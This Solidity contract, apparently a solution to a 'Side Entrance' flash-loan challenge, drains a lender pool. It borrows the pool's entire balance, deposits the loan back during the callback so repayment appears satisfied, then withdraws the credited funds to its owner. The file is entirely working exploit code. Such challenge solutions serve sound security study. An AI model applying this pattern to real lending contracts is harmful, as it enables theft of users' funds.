// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";
import { Ownable } from "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";

contract EvilReceiver is IFlashLoanEtherReceiver, Ownable {

    SideEntranceLenderPool pool;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    function executeFlashLoan() public onlyOwner {
        uint balance = address(pool).balance;
        pool.flashLoan(balance);
    }

    function withdraw() public onlyOwner {
        pool.withdraw();
        console.log("receiver balance: ", address(this).balance);

        // Don't know why this way is not working: payable(owner()).call{value: address(this).balance};
        // So I turned to use transfer() which is working.
        payable(owner()).transfer(address(this).balance);
    }

    receive () external payable {}
}